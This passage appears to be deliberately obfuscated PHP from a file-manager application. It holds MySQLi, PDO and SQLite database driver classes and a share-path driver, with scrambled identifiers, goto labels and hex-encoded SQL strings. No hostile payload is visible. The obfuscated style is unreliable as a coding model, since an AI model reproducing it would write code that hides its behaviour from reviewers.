DATA_PATH . $ÜÂ¢ÇÂ[1336] . rand_string(8) . $ÜÂ¢ÇÂ[8]; $¢úİ»ßÂ = IO::mkdir($¢úİ»ßÂ); $¢úİ»ßÂ = rtrim($¢úİ»ßÂ, $ÜÂ¢ÇÂ[8]) . $ÜÂ¢ÇÂ[8]; file_put_contents($¢úİ»ßÂ . $ÜÂ¢ÇÂ[1267], $ÜÂ¢ÇÂ[12]); file_put_contents(DATA_PATH . $ÜÂ¢ÇÂ[1267], $ÜÂ¢ÇÂ[12]); Model($ÜÂ¢ÇÂ[1334])->set($ÜÂ¢ÇÂ[1335], $¢úİ»ßÂ); return $¢úİ»ßÂ; } } goto B×ğöïïÇÚ; A„ÃïÛƒ„: class DbMysqli extends Db { public function __construct($Àáæ© = '') { $œòƒ´ª =& $_SERVER[ç¦¬”œš]; if (!extension_loaded($œòƒ´ª[991])) { think_exception(think_lang($œòƒ´ª[14]) . $œòƒ´ª[992]); } if (!empty($Àáæ©)) { $this->config = $Àáæ©; if (empty($this->config[$œòƒ´ª[17]])) { $this->config[$œòƒ´ª[17]] = $œòƒ´ª[12]; } } } public function connect($Ì–ÓŸƒÄ = '', $úü©¡¦ = 0) { $½Ë·™ =& $_SERVER[ç¦¬”œš]; if (!isset($this->linkID[$úü©¡¦])) { if (empty($Ì–ÓŸƒÄ)) { $Ì–ÓŸƒÄ = $this->config; } $this->linkID[$úü©¡¦] = new mysqli($Ì–ÓŸƒÄ[$½Ë·™[965]], $Ì–ÓŸƒÄ[$½Ë·™[967]], $Ì–ÓŸƒÄ[$½Ë·™[968]], $Ì–ÓŸƒÄ[$½Ë·™[21]], $Ì–ÓŸƒÄ[$½Ë·™[966]] ? intval($Ì–ÓŸƒÄ[$½Ë·™[966]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÖœâÅË = $this->linkID[$úü©¡¦]->server_version; $this->linkID[$úü©¡¦]->query($½Ë·™[969] . think_config($½Ë·™[970]) . $½Ë·™[58]); if ($ÖœâÅË > $½Ë·™[971]) { $this->linkID[$úü©¡¦]->query($½Ë·™[972]); } $this->connected = !0; if (1 != think_config($½Ë·™[22])) { unset($this->config); } } return $this->linkID[$úü©¡¦]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¶Œš¦Î) { $ãîõİı§ =& $_SERVER[ç¦¬”œš]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¶Œš¦Î; if ($this->queryID) { $this->free(); } think_action_status($ãîõİı§[23], 1); think_status($ãîõİı§[24]); $this->queryID = $this->_linkID->query($¶Œš¦Î); if ($this->_linkID->more_results()) { while (($œÓâ¶ú = $this->_linkID->next_result()) != NULL) { $œÓâ¶ú->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($­ ñÔï) { $í„Úç®ó =& $_SERVER[ç¦¬”œš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $­ ñÔï; if ($this->queryID) { $this->free(); } think_action_status($í„Úç®ó[25], 1); think_status($í„Úç®ó[24]); $ª‹Ö®Şä = $this->_linkID->query($­ ñÔï); $this->debug(); if (!1 === $ª‹Ö®Şä) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $·˜ÏÂ¨ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$·˜ÏÂ¨) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‹¿Î£®­ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$‹¿Î£®­) { $this->error(); return !1; } } return !0; } private function getAll() { $¸ÅúÙ = array(); if ($this->numRows > 0) { for ($‡Í¥à¼û = 0; $‡Í¥à¼û < $this->numRows; $‡Í¥à¼û++) { $¸ÅúÙ[$‡Í¥à¼û] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¸ÅúÙ; } public function getFields($†—«§«…) { $¾Ãëî©Ù =& $_SERVER[ç¦¬”œš]; $Õ³ÛâÂ” = $this->query($¾Ãëî©Ù[976] . $this->parseKey($†—«§«…)); $§ë¢òò» = array(); if ($Õ³ÛâÂ”) { foreach ($Õ³ÛâÂ” as $Áö ´é => $¢Æ ­—) { $§ë¢òò»[$¢Æ ­—[$¾Ãëî©Ù[31]]] = array($¾Ãëî©Ù[32] => $¢Æ ­—[$¾Ãëî©Ù[31]], $¾Ãëî©Ù[33] => $¢Æ ­—[$¾Ãëî©Ù[34]], $¾Ãëî©Ù[35] => (bool) ($¢Æ ­—[$¾Ãëî©Ù[36]] === $¾Ãëî©Ù[12]), $¾Ãëî©Ù[37] => $¢Æ ­—[$¾Ãëî©Ù[38]], $¾Ãëî©Ù[39] => strtolower($¢Æ ­—[$¾Ãëî©Ù[40]]) == $¾Ãëî©Ù[41], $¾Ãëî©Ù[42] => strtolower($¢Æ ­—[$¾Ãëî©Ù[43]]) == $¾Ãëî©Ù[44]); } } return $§ë¢òò»; } public function getTables($åÙ©í™¯ = '') { $şÅŒ½è =& $_SERVER[ç¦¬”œš]; $Î÷¯­œÆ = !empty($åÙ©í™¯) ? $şÅŒ½è[978] . $åÙ©í™¯ . $şÅŒ½è[979] : $şÅŒ½è[980]; $Ìæ®ú»„ = $this->query($Î÷¯­œÆ); $Éå§¥Á€ = array(); if ($Ìæ®ú»„) { foreach ($Ìæ®ú»„ as $ÀÚ…Š„í => $˜İ´§¸) { $Éå§¥Á€[$ÀÚ…Š„í] = current($˜İ´§¸); } } return $Éå§¥Á€; } public function replace($¾„èßÉŒ, $êãé°Û = array()) { $­•Ÿ’¾… =& $_SERVER[ç¦¬”œš]; foreach ($¾„èßÉŒ as $¹Á”ùÛ¿ => $¦Ñ¼áĞ) { $ĞÕ‘”¾ = $this->parseValue($¦Ñ¼áĞ); if (is_scalar($ĞÕ‘”¾)) { $­Ò°Â¤µ[] = $ĞÕ‘”¾; $ƒÚ¾÷½[] = $this->parseKey($¹Á”ùÛ¿); } } $üûĞö®ï = $­•Ÿ’¾…[981] . $this->parseTable($êãé°Û[$­•Ÿ’¾…[356]]) . $­•Ÿ’¾…[982] . implode($­•Ÿ’¾…[50], $ƒÚ¾÷½) . $­•Ÿ’¾…[983] . implode($­•Ÿ’¾…[50], $­Ò°Â¤µ) . $­•Ÿ’¾…[984]; return $this->execute($üûĞö®ï); } public function insertAll($ğÁ—º€, $”íµÍ‚‡ = array(), $¬µ®‰¡í = false) { $á¡„‘Åƒ =& $_SERVER[ç¦¬”œš]; if (!is_array($ğÁ—º€[0])) { return !1; } $ã±ø©¢ß = array_keys($ğÁ—º€[0]); $çğ•ñ‚ = array(); foreach ($ğÁ—º€ as $ÚıÁíÙ´) { $¿ŒÎ¼·Ù = array(); foreach ($ÚıÁíÙ´ as $Ëêç—ëˆ => $î¨ıæ»Î) { $î¨ıæ»Î = $this->parseValue($î¨ıæ»Î); if (is_scalar($î¨ıæ»Î)) { $¿ŒÎ¼·Ù[] = $î¨ıæ»Î; } } $çğ•ñ‚[] = $á¡„‘Åƒ[337] . implode($á¡„‘Åƒ[50], $¿ŒÎ¼·Ù) . $á¡„‘Åƒ[984]; } array_walk($ã±ø©¢ß, array($this, $á¡„‘Åƒ[985])); $Ë³ûÁ‘ = $¬µ®‰¡í ? $á¡„‘Åƒ[986] : $á¡„‘Åƒ[987]; $…« ×´” = $Ë³ûÁ‘ . $á¡„‘Åƒ[988] . $this->parseTable($”íµÍ‚‡[$á¡„‘Åƒ[356]]) . $á¡„‘Åƒ[982] . implode($á¡„‘Åƒ[50], $ã±ø©¢ß) . $á¡„‘Åƒ[989] . implode($á¡„‘Åƒ[50], $çğ•ñ‚); return $this->execute($…« ×´”); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $©÷ÅıÏË =& $_SERVER[ç¦¬”œš]; $this->error = $this->_linkID->errno . $©÷ÅıÏË[4] . $this->_linkID->error; if ($©÷ÅıÏË[12] != $this->queryStr) { $this->error .= LNG($©÷ÅıÏË[48]) . $this->queryStr; } think_trace($this->error, $©÷ÅıÏË[12], $©÷ÅıÏË[49]); return $this->error; } public function escapeString($–Ã˜Ğ¬¼) { if ($this->_linkID) { return $this->_linkID->real_escape_string($–Ã˜Ğ¬¼); } else { return addslashes($–Ã˜Ğ¬¼); } } public function parseKey(&$¹€–Äù, $Õòö÷¼Ö = true) { $­‘–—‰Ç =& $_SERVER[ç¦¬”œš]; if ($Õòö÷¼Ö) { $¹€–Äù = $this->parseKeyCheck($¹€–Äù); } if ($¹€–Äù != $­‘–—‰Ç[220] && !preg_match($­‘–—‰Ç[990], $¹€–Äù)) { $¹€–Äù = $­‘–—‰Ç[461] . trim($¹€–Äù, $­‘–—‰Ç[461]) . $­‘–—‰Ç[461]; } return $¹€–Äù; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($½¡²ˆÁ— = '') { $¶¾¥ˆ×¾ =& $_SERVER[ç¦¬”œš]; if (!class_exists($¶¾¥ˆ×¾[993])) { think_exception(think_lang($¶¾¥ˆ×¾[14]) . $¶¾¥ˆ×¾[994]); } if (!empty($½¡²ˆÁ—)) { $this->config = $½¡²ˆÁ—; if (empty($this->config[$¶¾¥ˆ×¾[17]])) { $this->config[$¶¾¥ˆ×¾[17]] = array(); } } } public function connect($î‹Ùı = '', $¯›Ş—¢ = 0) { $İ´¼‚Êı =& $_SERVER[ç¦¬”œš]; if (!isset($this->linkID[$¯›Ş—¢])) { if (empty($î‹Ùı)) { $î‹Ùı = $this->config; } $½¹Úç®ƒ = !empty($î‹Ùı[$İ´¼‚Êı[17]][$İ´¼‚Êı[18]]) ? $î‹Ùı[$İ´¼‚Êı[17]][$İ´¼‚Êı[18]] : $this->pconnect; if ($½¹Úç®ƒ) { $î‹Ùı[$İ´¼‚Êı[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¯›Ş—¢] = new PDO($î‹Ùı[$İ´¼‚Êı[995]], $î‹Ùı[$İ´¼‚Êı[967]], $î‹Ùı[$İ´¼‚Êı[968]], $î‹Ùı[$İ´¼‚Êı[17]]); } catch (PDOException $‡¨¨¬Ü±) { think_exception($‡¨¨¬Ü±->getMessage()); } $this->dbType = $this->_getDsnType($î‹Ùı[$İ´¼‚Êı[995]]); if (in_array($this->dbType, array($İ´¼‚Êı[996], $İ´¼‚Êı[997], $İ´¼‚Êı[998], $İ´¼‚Êı[999]))) { think_exception($İ´¼‚Êı[1000] . $this->dbType . $İ´¼‚Êı[1001] . $this->dbType . $İ´¼‚Êı[1002]); } if (!$this->linkID[$¯›Ş—¢]) { think_exception($İ´¼‚Êı[1003]); } try { $this->linkID[$¯›Ş—¢]->exec($İ´¼‚Êı[1004] . think_config($İ´¼‚Êı[970])); } catch (Exception $‡¨¨¬Ü±) { } $this->connected = !0; if (1 != think_config($İ´¼‚Êı[22])) { unset($this->config); } } return $this->linkID[$¯›Ş—¢]; } public function free() { $this->PDOStatement = null; } public function query($çÁ™“Ñâ, $ÙÇ–¢å = array()) { $¶ˆÎÏÜ =& $_SERVER[ç¦¬”œš]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $çÁ™“Ñâ; if (!empty($ÙÇ–¢å)) { $this->queryStr .= $¶ˆÎÏÜ[1005] . print_r($ÙÇ–¢å, !0) . $¶ˆÎÏÜ[1006]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¶ˆÎÏÜ[23], 1); think_status($¶ˆÎÏÜ[24]); $this->PDOStatement = $this->_linkID->prepare($çÁ™“Ñâ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Óõíıı¼ = $this->PDOStatement->execute($ÙÇ–¢å); $this->debug(); if (!1 === $Óõíıı¼) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($‚Ùª§Ğ, $ŠÌãüù = array()) { $®¬à©°ˆ =& $_SERVER[ç¦¬”œš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‚Ùª§Ğ; if (!empty($ŠÌãüù)) { $this->queryStr .= $®¬à©°ˆ[1005] . print_r($ŠÌãüù, !0) . $®¬à©°ˆ[1006]; } $°ÉÏÁÏô = !1; if ($this->dbType == $®¬à©°ˆ[999]) { if (preg_match($®¬à©°ˆ[1007], $this->queryStr, $¾›ğÕ„Ü)) { $this->table = think_config($®¬à©°ˆ[1008]) . str_ireplace(think_config($®¬à©°ˆ[1009]), $®¬à©°ˆ[454], $¾›ğÕ„Ü[2]); $°ÉÏÁÏô = (bool) $this->query($®¬à©°ˆ[1010] . strtoupper($this->table) . $®¬à©°ˆ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($®¬à©°ˆ[25], 1); think_status($®¬à©°ˆ[24]); $this->PDOStatement = $this->_linkID->prepare($‚Ùª§Ğ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ĞµÙÒ‡ó = $this->PDOStatement->execute($ŠÌãüù); $this->debug(); if (!1 === $ĞµÙÒ‡ó) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($°ÉÏÁÏô || preg_match($®¬à©°ˆ[1011], $‚Ùª§Ğ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¾ù¹‰Ä© = $this->_linkID->commit(); $this->transTimes = 0; if (!$¾ù¹‰Ä©) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $íİóé«‹ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$íİóé«‹) { $this->error(); return !1; } } return !0; } private function getAll() { $Ìõ…´¢À = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ìõ…´¢À); return $Ìõ…´¢À; } public function getFields($ÔãÅóÚÇ) { $À è”Ô =& $_SERVER[ç¦¬”œš]; $this->initConnect(!0); if (think_config($À è”Ô[1012])) { $Æ×ò»²ë = str_replace($À è”Ô[1013], $ÔãÅóÚÇ, think_config($À è”Ô[1012])); } else { switch ($this->dbType) { case $À è”Ô[996]: case $À è”Ô[1014]: $Æ×ò»²ë = "\123\105\x4c\105\x43\124\x20\40\40\x63\x6f\x6c\165\155\156\x5f\156\x61\155\x65\x20\141\163\x20\x27\116\x61\155\145\x27\x2c\x20\x20\40\144\x61\x74\141\137\x74\x79\160\145\40\x61\163\x20\x27\x54\x79\160\x65\47\x2c\40\x20\x20\x63\157\154\165\155\x6e\137\x64\x65\x66\141\165\154\164\x20\141\163\40\x27\x44\x65\x66\x61\165\x6c\x74\x27\54\x20\40\x20\151\163\x5f\156\165\x6c\154\141\x62\x6c\x65\x20\141\x73\40\x27\x4e\x75\154\x6c\x27\xa\11\11\106\122\117\x4d\11\151\x6e\146\157\162\155\x61\x74\x69\157\x6e\137\x73\143\150\145\x6d\x61\x2e\164\141\x62\154\x65\x73\x20\101\x53\x20\164\xa\11\11\112\117\111\x4e\11\151\x6e\x66\157\162\155\141\x74\x69\157\x6e\137\163\x63\x68\145\155\141\56\143\157\x6c\x75\155\x6e\x73\40\x41\123\x20\x63\xa\11\11\x4f\116\x20\x20\x74\x2e\x74\141\142\154\145\137\x63\x61\x74\x61\x6c\x6f\147\x20\x3d\40\143\56\164\x61\x62\154\145\137\x63\141\164\141\154\157\x67\xa\11\11\x41\116\x44\x20\164\x2e\164\x61\x62\x6c\145\137\x73\143\x68\145\155\x61\x20\x3d\40\143\x2e\164\x61\x62\154\x65\137\x73\143\150\x65\155\x61\xa\x9\x9\101\x4e\x44\40\164\x2e\x74\x61\x62\x6c\145\137\x6e\141\x6d\145\x20\x3d\x20\x63\56\x74\141\x62\x6c\145\x5f\x6e\141\155\x65\12\11\11\x57\110\105\122\x45\x20\40\x20\164\x2e\x74\x61\x62\x6c\145\137\x6e\141\155\x65\40\x3d\40\47{$ÔãÅóÚÇ}\x27"; break; case $À è”Ô[1015]: $Æ×ò»²ë = $À è”Ô[1016] . $ÔãÅóÚÇ . $À è”Ô[1017]; break; case $À è”Ô[997]: case $À è”Ô[999]: $Æ×ò»²ë = $À è”Ô[1018] . $À è”Ô[1019] . $À è”Ô[1020] . strtoupper($ÔãÅóÚÇ) . $À è”Ô[1021] . strtoupper($ÔãÅóÚÇ) . $À è”Ô[1022]; break; case $À è”Ô[1023]: $Æ×ò»²ë = $À è”Ô[1024] . $ÔãÅóÚÇ . $À è”Ô[1025]; break; case $À è”Ô[998]: break; case $À è”Ô[1026]: default: $Æ×ò»²ë = $À è”Ô[1027] . ($this->dbType == $À è”Ô[1026] ? "\140{$ÔãÅóÚÇ}\140" : $ÔãÅóÚÇ); } } $§€ˆèúç = $this->query($Æ×ò»²ë); $Åñ»ìÇ¨ = array(); if ($§€ˆèúç) { foreach ($§€ˆèúç as $ÊåôÍÈ— => $À‰—˜…–) { $À‰—˜…– = array_change_key_case($À‰—˜…–); $À‰—˜…–[$À è”Ô[32]] = isset($À‰—˜…–[$À è”Ô[32]]) ? $À‰—˜…–[$À è”Ô[32]] : $À è”Ô[454]; $À‰—˜…–[$À è”Ô[33]] = isset($À‰—˜…–[$À è”Ô[33]]) ? $À‰—˜…–[$À è”Ô[33]] : $À è”Ô[454]; $´ğäŞØœ = isset($À‰—˜…–[$À è”Ô[350]]) ? $À‰—˜…–[$À è”Ô[350]] : $À‰—˜…–[$À è”Ô[32]]; $Åñ»ìÇ¨[$´ğäŞØœ] = array($À è”Ô[32] => $´ğäŞØœ, $À è”Ô[33] => $À‰—˜…–[$À è”Ô[33]], $À è”Ô[35] => (bool) (isset($À‰—˜…–[$À è”Ô[106]]) && $À‰—˜…–[$À è”Ô[106]] === $À è”Ô[12] || isset($À‰—˜…–[$À è”Ô[35]]) && $À‰—˜…–[$À è”Ô[35]] === $À è”Ô[12]), $À è”Ô[37] => isset($À‰—˜…–[$À è”Ô[37]]) ? $À‰—˜…–[$À è”Ô[37]] : (isset($À‰—˜…–[$À è”Ô[56]]) ? $À‰—˜…–[$À è”Ô[56]] : $À è”Ô[454]), $À è”Ô[39] => isset($À‰—˜…–[$À è”Ô[97]]) ? strtolower($À‰—˜…–[$À è”Ô[97]]) == $À è”Ô[41] : (isset($À‰—˜…–[$À è”Ô[57]]) ? $À‰—˜…–[$À è”Ô[57]] : !1), $À è”Ô[42] => isset($À‰—˜…–[$À è”Ô[1028]]) ? strtolower($À‰—˜…–[$À è”Ô[1028]]) == $À è”Ô[44] : (isset($À‰—˜…–[$À è”Ô[97]]) ? $À‰—˜…–[$À è”Ô[97]] : !1)); } } return $Åñ»ìÇ¨; } public function getTables($½êá´Ç¹ = '') { $Óªîğ¡¸ =& $_SERVER[ç¦¬”œš]; if (think_config($Óªîğ¡¸[1029])) { $¯€ì¨–Ù = str_replace($Óªîğ¡¸[1030], $½êá´Ç¹, think_config($Óªîğ¡¸[1029])); } else { switch ($this->dbType) { case $Óªîğ¡¸[997]: case $Óªîğ¡¸[999]: $¯€ì¨–Ù = $Óªîğ¡¸[1031]; break; case $Óªîğ¡¸[996]: case $Óªîğ¡¸[1014]: $¯€ì¨–Ù = $Óªîğ¡¸[1032]; break; case $Óªîğ¡¸[1023]: $¯€ì¨–Ù = $Óªîğ¡¸[1033]; break; case $Óªîğ¡¸[998]: think_exception(think_lang($Óªîğ¡¸[1034]) . $Óªîğ¡¸[1035]); break; case $Óªîğ¡¸[1015]: $¯€ì¨–Ù = $Óªîğ¡¸[45] . $Óªîğ¡¸[46] . $Óªîğ¡¸[47]; break; case $Óªîğ¡¸[1026]: default: if (!empty($½êá´Ç¹)) { $¯€ì¨–Ù = $Óªîğ¡¸[978] . $½êá´Ç¹ . $Óªîğ¡¸[979]; } else { $¯€ì¨–Ù = $Óªîğ¡¸[980]; } } } $ıùûõÃ = $this->query($¯€ì¨–Ù); $³Ñ¼‡Æö = array(); foreach ($ıùûõÃ as $ÑÆ¦˜Õ => $Ö¿€ø™†) { $³Ñ¼‡Æö[$ÑÆ¦˜Õ] = current($Ö¿€ø™†); } return $³Ñ¼‡Æö; } protected function parseLimit($ŒşìõÅ€) { $İ€†§Š =& $_SERVER[ç¦¬”œš]; $Ã²µæì² = $İ€†§Š[12]; if (!empty($ŒşìõÅ€)) { switch ($this->dbType) { case $İ€†§Š[1023]: case $İ€†§Š[1015]: $ŒşìõÅ€ = explode($İ€†§Š[50], $ŒşìõÅ€); if (count($ŒşìõÅ€) > 1) { $Ã²µæì² .= $İ€†§Š[51] . $ŒşìõÅ€[1] . $İ€†§Š[52] . $ŒşìõÅ€[0] . $İ€†§Š[53]; } else { $Ã²µæì² .= $İ€†§Š[51] . $ŒşìõÅ€[0] . $İ€†§Š[53]; } break; case $İ€†§Š[996]: case $İ€†§Š[1014]: break; case $İ€†§Š[998]: break; case $İ€†§Š[997]: case $İ€†§Š[999]: break; case $İ€†§Š[1026]: default: $Ã²µæì² .= $İ€†§Š[51] . $ŒşìõÅ€ . $İ€†§Š[53]; } } return $Ã²µæì²; } public function parseKey(&$Çò¾÷¹Ï, $á®Ô©»ù = true) { $ÄÕ§Œğı =& $_SERVER[ç¦¬”œš]; if ($á®Ô©»ù) { $Çò¾÷¹Ï = $this->parseKeyCheck($Çò¾÷¹Ï); } if ($this->dbType == $ÄÕ§Œğı[1026]) { if ($Çò¾÷¹Ï != $ÄÕ§Œğı[220] && !preg_match($ÄÕ§Œğı[990], $Çò¾÷¹Ï)) { $Çò¾÷¹Ï = $ÄÕ§Œğı[461] . trim($Çò¾÷¹Ï, $ÄÕ§Œğı[461]) . $ÄÕ§Œğı[461]; } return $Çò¾÷¹Ï; } else { return parent::parseKey($Çò¾÷¹Ï, $á®Ô©»ù); } } public function close() { $this->_linkID = null; } public function error() { $ÍÊÃ„Ôº =& $_SERVER[ç¦¬”œš]; if ($this->PDOStatement) { $ï­´ş†à = $this->PDOStatement->errorInfo(); $this->error = $ï­´ş†à[1] . $ÍÊÃ„Ôº[4] . $ï­´ş†à[2]; } else { $this->error = $ÍÊÃ„Ôº[12]; } if ($ÍÊÃ„Ôº[12] != $this->queryStr) { $this->error .= LNG($ÍÊÃ„Ôº[48]) . $this->queryStr; } think_trace($this->error, $ÍÊÃ„Ôº[12], $ÍÊÃ„Ôº[49]); return $this->error; } public function escapeString($¯°²‚µÄ) { $ÀÍ—Ÿ¨¤ =& $_SERVER[ç¦¬”œš]; switch ($this->dbType) { case $ÀÍ—Ÿ¨¤[1023]: case $ÀÍ—Ÿ¨¤[996]: case $ÀÍ—Ÿ¨¤[1014]: case $ÀÍ—Ÿ¨¤[1026]: return addslashes($¯°²‚µÄ); case $ÀÍ—Ÿ¨¤[998]: case $ÀÍ—Ÿ¨¤[1015]: case $ÀÍ—Ÿ¨¤[997]: case $ÀÍ—Ÿ¨¤[999]: return str_ireplace($ÀÍ—Ÿ¨¤[58], $ÀÍ—Ÿ¨¤[59], $¯°²‚µÄ); } } protected function parseValue($ÚÓæõªÈ) { $ÁËŠ¹çÜ =& $_SERVER[ç¦¬”œš]; if (is_string($ÚÓæõªÈ)) { $Š¤Ÿùê‹ = strpos($ÚÓæõªÈ, $ÁËŠ¹çÜ[4]) === 0 && in_array($ÚÓæõªÈ, array_keys($this->bind)); $ÚÓæõªÈ = $Š¤Ÿùê‹ ? $this->escapeString($ÚÓæõªÈ) : $ÁËŠ¹çÜ[1036] . $this->escapeString($ÚÓæõªÈ) . $ÁËŠ¹çÜ[1036]; } elseif (isset($ÚÓæõªÈ[0]) && is_string($ÚÓæõªÈ[0]) && strtolower($ÚÓæõªÈ[0]) == $ÁËŠ¹çÜ[373]) { $ÚÓæõªÈ = $this->escapeString($ÚÓæõªÈ[1]); } elseif (is_array($ÚÓæõªÈ)) { $ÚÓæõªÈ = array_map(array($this, $ÁËŠ¹çÜ[1037]), $ÚÓæõªÈ); } elseif (is_bool($ÚÓæõªÈ)) { $ÚÓæõªÈ = $ÚÓæõªÈ ? $ÁËŠ¹çÜ[91] : $ÁËŠ¹çÜ[228]; } elseif (is_null($ÚÓæõªÈ)) { $ÚÓæõªÈ = $ÁËŠ¹çÜ[106]; } return $ÚÓæõªÈ; } public function getLastInsertId() { $ù„³¢ŠÉ =& $_SERVER[ç¦¬”œš]; switch ($this->dbType) { case $ù„³¢ŠÉ[1023]: case $ù„³¢ŠÉ[1015]: case $ù„³¢ŠÉ[996]: case $ù„³¢ŠÉ[1014]: case $ù„³¢ŠÉ[998]: case $ù„³¢ŠÉ[1026]: return $this->_linkID->lastInsertId(); case $ù„³¢ŠÉ[997]: case $ù„³¢ŠÉ[999]: $åÓ²Öæ = $this->table; $—¨…‚˜Ì = $this->query("\x53\105\x4c\x45\x43\124\40{$åÓ²Öæ}\56\x63\165\x72\x72\x76\x61\x6c\40\x63\165\x72\162\166\x61\154\40\x46\122\x4f\x4d\40\144\165\141\x6c"); return $—¨…‚˜Ì ? $—¨…‚˜Ì[0][$ù„³¢ŠÉ[1038]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Ò±òìÙĞ) { $Ç›—¢Ò£ =& $_SERVER[ç¦¬”œš]; if (!CacheLock::fileLock($Ç›—¢Ò£[13])) { return !1; } $Ş†¶ËØï = parent::query($Ò±òìÙĞ); CacheLock::fileUnLock($Ç›—¢Ò£[13]); return $Ş†¶ËØï; } public function execute($…³·¯Ş) { $Ù¬›â—’ =& $_SERVER[ç¦¬”œš]; if (!CacheLock::fileLock($Ù¬›â—’[13])) { return !1; } $Ô¥š£•Ö = parent::execute($…³·¯Ş); CacheLock::fileUnLock($Ù¬›â—’[13]); return $Ô¥š£•Ö; } } goto e×ôØ®£Ç; a™Õ†øåÍ: class PathDriverDriverShareItem { public function __construct($ßš×Õ¥) { $this->pathParse = $ßš×Õ¥; } public function __call($öƒ°´­š, $£Š¾õëŸ) { $¹ÌÓèğ =& $_SERVER[ç¦¬”œš]; if (method_exists($this, $öƒ°´­š)) { return; } $ææ¿öºã = call_user_func_array(array($¹ÌÓèğ[1428], $öƒ°´­š), $£Š¾õëŸ); $şà÷••ê = array($¹ÌÓèğ[1429], $¹ÌÓèğ[1430], $¹ÌÓèğ[1431], $¹ÌÓèğ[1432], $¹ÌÓèğ[627], $¹ÌÓèğ[629], $¹ÌÓèğ[1433], $¹ÌÓèğ[110], $¹ÌÓèğ[1434], $¹ÌÓèğ[1435]); if (in_array($öƒ°´­š, $şà÷••ê)) { $ææ¿öºã = $this->getPathOuter($ææ¿öºã); } return $ææ¿öºã; } public function copy($²Æ‚¾È, $ßê½í¯é, $õÎ½šËÎ = false, $ŠÕŒ½¤â = false) { return $this->copyMove($²Æ‚¾È, $ßê½í¯é, $õÎ½šËÎ, $_SERVER[ç¦¬”œš][627], $ŠÕŒ½¤â); } public function move($†ÁÙŞæ¹, $ÄıüéŸ¬, $­Ê·ŠØ¿ = false, $®ÉåÚ¸ = false) { return $this->copyMove($†ÁÙŞæ¹, $ÄıüéŸ¬, $­Ê·ŠØ¿, $_SERVER[ç¦¬”œš][629], $®ÉåÚ¸); } private function copyMove($ğİº×, $Õñ©¾—÷, $ÙÓ¢ôıµ, $»ú®Ãìê, $ëÂ·¬Şú = false) { $òÈ¸¥Ø· =& $_SERVER[ç¦¬”œš]; $—¡ŞÆò = $Õñ©¾—÷; $Æ„úüã§ = IO::driverMake($Õñ©¾—÷); if ($Æ„úüã§->pathParse[$òÈ¸¥Ø·[1233]]) { $Õñ©¾—÷ = $Æ„úüã§->pathParse[$òÈ¸¥Ø·[1233]]; } else { $Õñ©¾—÷ = $—¡ŞÆò; } $óØé˜´ = IO::copyMove($ğİº×, $Õñ©¾—÷, $ÙÓ¢ôıµ, $»ú®Ãìê, $ëÂ·¬Şú); $óØé˜´ = $this->getPathOuter($óØé˜´); return $óØé˜´; } public function pathThis($ášõÙŸç) { return get_path_this($this->pathParse[$_SERVER[ç¦¬”œš][87]]); } public function pathFather($®¾×¦Î) { return get_path_father($this->pathParse[$_SERVER[ç¦¬”œš][87]]); } public function iconvSystem($“•Œı°) { return $“•Œı°; } protected function infoParse($ŞƒáÒÊ, $Ò²æÊÙÊ = false) { $„ò¼úÑö =& $_SERVER[ç¦¬”œš]; $‰±™…Ù = $this->pathParse[$„ò¼úÑö[569]][$„ò¼úÑö[1258]] . $this->pathParse[$„ò¼úÑö[1251]]; if ($Ò²æÊÙÊ) { $ßß¢è¶¼ = IO::infoWithChildren($‰±™…Ù); } else { $ßß¢è¶¼ = IO::info($‰±™…Ù); } $ƒÙø£Ïˆ = $this->pathParse[$„ò¼úÑö[569]]; return Action($„ò¼úÑö[1426])->_shareItemeParse($ßß¢è¶¼, $ƒÙø£Ïˆ); } public function listAll($ËÂú—™ë) { $²·œä‚î =& $_SERVER[ç¦¬”œš]; $·Öïû¹ = IO::listAll($ËÂú—™ë); $¹£¿Æè÷ = rtrim($this->pathParse[$²·œä‚î[569]][$²·œä‚î[1258]], $²·œä‚î[8]); foreach ($·Öïû¹ as &$êº¾„ŞÒ) { $êº¾„ŞÒ[$²·œä‚î[87]] = $this->pathDriver . $²·œä‚î[8] . ltrim(substr($êº¾„ŞÒ[$²·œä‚î[87]], strlen($¹£¿Æè÷)), $²·œä‚î[8]); } unset($êº¾„ŞÒ); return $·Öïû¹; } public function listAllSimple($·‘©«Àµ, $ëåöÇöı = false) { $—€¤¯’ =& 